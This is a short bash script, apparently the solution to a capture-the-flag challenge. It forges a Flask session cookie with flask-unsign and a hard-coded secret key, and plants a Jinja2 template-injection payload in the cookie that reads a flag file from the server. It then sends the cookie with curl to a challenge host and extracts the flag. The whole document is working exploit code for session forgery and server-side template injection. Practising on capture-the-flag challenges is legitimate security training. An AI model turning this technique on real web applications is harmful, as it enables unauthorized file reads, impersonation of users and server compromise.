#!/bin/bash

PAYLOAD="{{get_flashed_messages.__globals__.__builtins__.open(\"/home/ctf/flag.txt\").read()}}"

COOKIE=$(flask-unsign -s -c "{'name': '$PAYLOAD', '_user_id':'1', '_id':'1'}" --secret SuperDuperSecureSecretKey1234!)
curl -s --cookie "session=$COOKIE" https://nessus-rose.chals.io/dashboard | grep -oE "flag{.*}"
